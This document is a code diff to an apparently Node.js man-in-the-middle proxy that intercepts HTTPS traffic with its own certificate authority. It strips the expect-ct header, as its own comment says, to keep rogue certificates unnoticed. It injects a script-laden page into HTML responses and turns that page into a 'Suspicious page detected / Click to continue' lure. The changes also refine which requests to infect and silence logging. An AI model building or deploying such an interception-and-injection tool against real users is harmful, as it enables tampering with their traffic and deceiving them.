@@ -76,7 +76,10 @@ function build_template_post(args){
     ${args.inline_js}
     </script>
   </head>
-  <body>THIS IS THE INJECTED PAGE</body>
+  <body>
+    Suspicious page detected.
+     <button id="myBtn" onclick="__replace_page()">Click to continue</button>
+  </body>
 </html>`;
     return post_data;
 }
@@ -89,7 +92,7 @@ class AddStubAndBase64 extends Base64encode {
     }
 
     _transform(chunk, encoding, callback){
-        console.log("in _transform");
+        // console.log("in _transform");
 
         if (!this.injectionStarted){
             let compressed = false;
@@ -101,7 +104,7 @@ class AddStubAndBase64 extends Base64encode {
     }
 
     _flush(callback){
-        console.log("in _flush");
+        // console.log("in _flush");
         super._flush(()=>{
             const inline_js = fs.readFileSync("injected_page.js", "utf8");;
             const post_data = build_template_post({inline_js});
@@ -137,6 +140,16 @@ function onRequest(ctx, callback)
 }
 
 
+function getProp(self, prop) {
+    for (let key in self) {
+        if (key.toLowerCase() == prop.toLowerCase()) {
+            return self[key];
+        }
+    }
+    return null;
+}
+
+
 /**
  * handle response header from server
  *
@@ -156,12 +169,15 @@ function onResponse(ctx, callback)
      * certificates for that site from going unnoticed.
      */
     delete resp_headers['expect-ct'];
+    // delete resp_headers['public-key-pins-report-only'];
 
-    const must_inject = (
-        ENABLE_INJECTION &&
-        resp_headers['content-type'] &&
-            resp_headers['content-type'].startsWith('text/html') &&
-            ! ('x-requested-with' in req_headers));
+    // note: headers converted to lowercase by nodejs
+    const is_html = 'content-type' in resp_headers &&
+          resp_headers['content-type'].startsWith('text/html');
+    const is_xhr = ('x-requested-with' in req_headers);
+    const is_cors = ('origin' in req_headers);
+
+    const must_inject = (ENABLE_INJECTION && is_html && !is_xhr && !is_cors);
 
     if (must_inject){
         delete resp_headers['content-length'];
@@ -189,7 +205,7 @@ function onResponseData(ctx, chunk, callback)
  */
 function onResponseEnd(ctx, callback)
 {
-    console.log("in onResponseEnd", ctx.contextid);
+    // console.log("in onResponseEnd", ctx.contextid);
 
     const resp_headers = ctx.serverToProxyResponse.headers;
     if (resp_headers['transfer-encoding'] != 'chunked'){
@@ -208,10 +224,10 @@ proxy.onResponseData(onResponseData);
 proxy.onResponseEnd(onResponseEnd);
 
 
-
 proxy.listen({
     port: PROXY_PORT,
-    silent:false
+    // silent:false
+    silent:true
 });
 
 const ca_path = proxy.sslCaDir + '/certs/ca.pem';
